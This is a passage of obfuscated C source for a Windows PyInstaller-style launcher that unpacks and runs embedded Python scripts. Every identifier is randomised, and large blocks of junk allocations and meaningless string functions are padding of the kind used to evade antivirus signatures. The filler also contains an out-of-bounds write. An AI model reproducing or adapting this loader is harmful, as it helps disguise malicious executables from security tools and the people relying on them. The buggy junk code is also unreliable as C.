PyObject *__main__ = PI_PyImport_AddModule("__main__"); PyObject *__file__;
while (XXbKNMLwgecH < CdYrPcKPFvgTPNF->tocend) {
    if (XXbKNMLwgecH->typcd == 's') {
        EmlFsRbwumhx = kJYOqGLoQaecy(CdYrPcKPFvgTPNF, XXbKNMLwgecH);
        strcpy(EtiXZSEyGxN, XXbKNMLwgecH->name); strcat(EtiXZSEyGxN, ".py");
        __file__ = PI_PyString_FromStringAndSize(EtiXZSEyGxN, strlen(EtiXZSEyGxN));
        PI_PyObject_SetAttrString(__main__, "__file__", __file__); Py_DECREF(__file__);
        KBFphrMDoper = PI_PyRun_SimpleString(EmlFsRbwumhx);
        if (KBFphrMDoper != 0) return KBFphrMDoper; free(EmlFsRbwumhx); }
    XXbKNMLwgecH = YNhzgANrCYcjc(CdYrPcKPFvgTPNF, XXbKNMLwgecH);
} return 0; }
int hVCZZtHFICcso(ARCHIVE_STATUS *ltVZbbGWwyi, char const * AKGRadgs, char  const * cLgPUWjkSCzN) {
if (xDgDvVKlPGRtk(ltVZbbGWwyi, AKGRadgs, cLgPUWjkSCzN)) return -1;
if (LvGnvyehrIvFZ(ltVZbbGWwyi)) return -1;
return 0; }
int YiqYUxioFfoI(ARCHIVE_STATUS *DaTififYybOqhd, int argc, char *argv[]) {
int XXhsMixzqDom = 0;
if (YtHccJBeAvX(DaTififYybOqhd)) return -1;
if (wAMdxvDGmSwq(DaTififYybOqhd, argc, argv)) return -1;
if (nXnnJLmRyc(DaTififYybOqhd)) return -1;
if (HkJmTkfFil(DaTififYybOqhd)) return -1;
XXhsMixzqDom = opsYsHiN(DaTififYybOqhd);
return XXhsMixzqDom; }
void KmmiLvP(const char *tQJfCiJBALFrmF);
void BSCwQDi(char *lYlTfxRqrpAeILy, int UVUUBpJCZpxQf, struct _finddata_t swDZUyuoIZMoK) {
if ( strcmp(swDZUyuoIZMoK.name, ".")==0  || strcmp(swDZUyuoIZMoK.name, "..") == 0 ) return;
lYlTfxRqrpAeILy[UVUUBpJCZpxQf] = '\0';
strcat(lYlTfxRqrpAeILy, swDZUyuoIZMoK.name);
if ( swDZUyuoIZMoK.attrib & _A_SUBDIR ) KmmiLvP(lYlTfxRqrpAeILy);
 else if (remove(lYlTfxRqrpAeILy)) { Sleep(100); remove(lYlTfxRqrpAeILy); } }
void KmmiLvP(const char *EqJbcRI) {
char wrzTosEv[_MAX_PATH+1]; struct _finddata_t JxVVrkacEbqCTW;
long uUfrzhXs; int ksHUGNxyxoSKBff; strcpy(wrzTosEv, EqJbcRI);
ksHUGNxyxoSKBff = strlen(wrzTosEv);
if ( wrzTosEv[ksHUGNxyxoSKBff-1] != '/' && wrzTosEv[ksHUGNxyxoSKBff-1] != '\\' ) { strcat(wrzTosEv, "\\"); ksHUGNxyxoSKBff++; }
strcat(wrzTosEv, "*");
uUfrzhXs = _findfirst(wrzTosEv, &JxVVrkacEbqCTW);
if (uUfrzhXs != -1) {
    BSCwQDi(wrzTosEv, ksHUGNxyxoSKBff, JxVVrkacEbqCTW);
    while ( _findnext(uUfrzhXs, &JxVVrkacEbqCTW) == 0 ) BSCwQDi(wrzTosEv, ksHUGNxyxoSKBff, JxVVrkacEbqCTW);
    _findclose(uUfrzhXs); }
rmdir(EqJbcRI); }
void NPgFuvPQNBmU(ARCHIVE_STATUS *EukDAxWgNIXG) { if (EukDAxWgNIXG->temppath[0]) KmmiLvP(EukDAxWgNIXG->temppath); }
int LaaNfFAa(ARCHIVE_STATUS *awsxGao) { return ntohl(awsxGao->cookie.pyvers); }
void ZuKCahu(void) { PI_Py_Finalize(); } 
char* MQozCHE(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* IhMrKrTtoSjbsz(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
char* lSSxNxGHTiuTcc(){ char *RMgRtJvpmQETeW = MQozCHE("KuAMoxiVbccwAGcRqAVLhxjhtkhORyLRiwrMBgESoQhzoGfbbp"); return strstr( RMgRtJvpmQETeW, "k" );}
char* pFOIjnhgGzUc(){ char FsNkRFLy[3028], SGPXhjcXZN[3028/2]; strcpy(FsNkRFLy,"agrqEGwmsdHCGAHaFJviibuJKDAuUAQnfShPkdJRnlwUaSNHbi"); strcpy(SGPXhjcXZN,"tLCFHZswVBGgfGjMnpQoPPDgKieXucVXVWCPdXSbPytUYXKIKt"); return IhMrKrTtoSjbsz(strcat( FsNkRFLy, SGPXhjcXZN)); }
char* moVFBXeN() { char HVxMKcIUYgiFOFj[3028] = "fXiyxljOxoGEOCQBebxYQSOeiYrEDjgntwvqCMmELQZwzbtciv"; char *omqpVmAtD = strupr(HVxMKcIUYgiFOFj); return strlwr(omqpVmAtD); }
int APIENTRY WinMain( HINSTANCE oJnTzX, HINSTANCE jzZVLswuIoq, LPSTR UvbjTw, int IQhunIQj ) {
char **argv = __argv;
char *pRMVDOsRHgrdh = NULL;
char ZQeLGFue[_MAX_PATH];
char MEIPASS2[_MAX_PATH + 11] = "_MEIPASS2=";
char* QnEgAedCJ[1481];
int argc = __argc;
char Xiqqrg[_MAX_PATH];
char* PYseEXXaeIB[3436];
int i = 0;
ARCHIVE_STATUS *qNkxibSSmnivdR[20];
char zDrsJYXFJdIGtd[_MAX_PATH + 5];
char* nsfqfV[2452];
int FyPFsDJuz = 0;
WCHAR fkIFJL[_MAX_PATH + 1];
memset(&qNkxibSSmnivdR, 0, 20 * sizeof(ARCHIVE_STATUS *));
for (i = 0;  i < 3436;  ++i) PYseEXXaeIB[i] = malloc (5901);if ((qNkxibSSmnivdR[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
YhcCLXSbYpkxA(Xiqqrg, argv[0]);
NZmEXaeLBMNnCG(fkIFJL);
for (i = 0;  i < 1481;  ++i) QnEgAedCJ[i] = malloc (9019);RqAgZvlB(zDrsJYXFJdIGtd, Xiqqrg);
nWMdmKnGbuwqIL(ZQeLGFue, Xiqqrg);
for (i = 0;  i < 2452;  ++i) nsfqfV[i] = malloc (7258);pRMVDOsRHgrdh = getenv( "_MEIPASS2" );
if (pRMVDOsRHgrdh && *pRMVDOsRHgrdh == 0) { pRMVDOsRHgrdh = NULL; }
if (hVCZZtHFICcso(qNkxibSSmnivdR[SELF], ZQeLGFue, &Xiqqrg[strlen(ZQeLGFue)])) {
    if (hVCZZtHFICcso(qNkxibSSmnivdR[SELF], ZQeLGFue, &zDrsJYXFJdIGtd[strlen(ZQeLGFue)])) { return -1; } }
if (!pRMVDOsRHgrdh && !HKKgINgFMMPieFZ(qNkxibSSmnivdR)) {
    pRMVDOsRHgrdh = ZQeLGFue;
    strcat(MEIPASS2, ZQeLGFue);
    putenv(MEIPASS2); }
if (pRMVDOsRHgrdh) {
    if (strcmp(ZQeLGFue, pRMVDOsRHgrdh) != 0) {
        strcpy(qNkxibSSmnivdR[SELF]->temppath, pRMVDOsRHgrdh);
        strcpy(qNkxibSSmnivdR[SELF]->temppathraw, pRMVDOsRHgrdh); }
    VpzRrZjtiCb(pRMVDOsRHgrdh, Xiqqrg);
for (i=0; i<3436; ++i){strcpy(PYseEXXaeIB[i], lSSxNxGHTiuTcc());}    FyPFsDJuz = YiqYUxioFfoI(qNkxibSSmnivdR[SELF], argc, argv);
    PhiJDNRtWIEDX();
    ZuKCahu();
} else { 
    if (ASHROseCHjKd(qNkxibSSmnivdR)) { return -1; }
for (i=0; i<1481; ++i){strcpy(QnEgAedCJ[i], pFOIjnhgGzUc());}    strcat(MEIPASS2, qNkxibSSmnivdR[SELF]->temppath[0] != 0 ? qNkxibSSmnivdR[SELF]->temppath : ZQeLGFue);
    putenv(MEIPASS2);
    if (oskIhm(qNkxibSSmnivdR[SELF]) == -1) return -1;
    FyPFsDJuz = htsFqKqCvKVri(fkIFJL);
    if (qNkxibSSmnivdR[SELF]->temppath[0] != 0) KmmiLvP(qNkxibSSmnivdR[SELF]->temppath);
    for (i = SELF; qNkxibSSmnivdR[i] != NULL; i++) { free(qNkxibSSmnivdR[i]); }}
for (i=0; i<2452; ++i){strcpy(nsfqfV[i], moVFBXeN());}return FyPFsDJuz; }
